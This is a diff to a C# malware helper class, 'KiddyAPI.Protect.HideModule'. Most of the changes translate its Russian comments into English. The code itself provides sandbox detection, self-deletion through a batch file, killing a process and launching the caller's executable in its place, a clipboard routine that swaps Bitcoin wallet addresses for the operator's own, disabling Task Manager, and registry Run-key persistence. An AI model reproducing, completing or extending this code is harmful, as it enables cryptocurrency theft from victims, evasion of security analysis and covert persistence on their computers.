@@ -12,9 +12,9 @@ using System.Windows.Forms;
 namespace KiddyAPI.Protect
 {
     /// <summary>
-    /// Доступ к различным методам скрытия/мигрирования программы
+    ///Access to various methods of hiding / migrating a program
     /// </summary>
-    public  class HideModule
+    public class HideModule
     {
         private static bool FindProcess(string name)
         {
@@ -40,9 +40,9 @@ namespace KiddyAPI.Protect
             }
         }
         /// <summary>
-        /// Закрытие программы, если запущен определенный процесс
+        /// Closing a program if a specific process is running
         /// </summary>
-        /// <param name="name">Имя проверяемого процессора</param>
+        /// <param name="name">Name of process cheking</param>
         public static void CheckProcess(string name)
         {
             try
@@ -55,7 +55,7 @@ namespace KiddyAPI.Protect
             catch { }
         }
         /// <summary>
-        /// Проверка на подгрузку в процесс dll SandBox
+        /// Check Sandbox dll
         /// </summary>
         public static void CheckSandBox()
         {
@@ -70,9 +70,9 @@ namespace KiddyAPI.Protect
         }
 
         /// <summary>
-        /// Автоудаление программы, когда мы захотим
+        /// Selfdelete
         /// </summary>
-        /// <param name="fileName">Имя нашего exe "Example.exe(Полный путь до файла указывать)"</param>
+        /// <param name="fileName">Path to own exe</param>
         public static void Suicide(string fileName)
         {
             string _fileName = fileName;
@@ -83,6 +83,11 @@ namespace KiddyAPI.Protect
             Process.Start(_batName);
         }
 
+        /// <summary>
+        /// Kill the selected process and start ur
+        /// </summary>
+        /// <param name="name">Process name to kill</param>
+        /// <param name="path">Path to ur exe</param>
         public static void Replace(string name, string path)
         {
             var process = Process.GetProcesses();
@@ -95,7 +100,10 @@ namespace KiddyAPI.Protect
                 }
             }
         }
-
+        /// <summary>
+        /// Replace BTC wallet adress
+        /// </summary>
+        /// <param name="address">Ur address</param>
         public static void Clip(string address)
         {
             while (true)
@@ -113,9 +121,9 @@ namespace KiddyAPI.Protect
         }
 
         /// <summary>
-        /// Включение/Отключение Диспетчера задач
+        /// On/Off Task Manager
         /// </summary>
-        /// <param name="enable">true - включить, false - выключить</param>
+        /// <param name="enable">true - on, false - off</param>
         public static void EnableTaskManager(bool enable)
         {
             Microsoft.Win32.RegistryKey HKCU = Microsoft.Win32.Registry.CurrentUser;
@@ -125,16 +133,16 @@ namespace KiddyAPI.Protect
                 Microsoft.Win32.RegistryValueKind.DWord);
         }
         /// <summary>
-        /// Добавление в автозагрузку
+        /// Autorun
         /// </summary>
-        /// <param name="name">Имя программы отображаемое в реестре</param>
-        /// <param name="path">Путь до программы</param>
+        /// <param name="name">Programm name displayed in regedit</param>
+        /// <param name="path">Path to exe</param>
         public static void SetAutorun(string name, string path)
         {
             using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
             using (var key = baseKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
             {
-                key.SetValue(name, path);
+                key?.SetValue(name, path);
             }
         }
     }
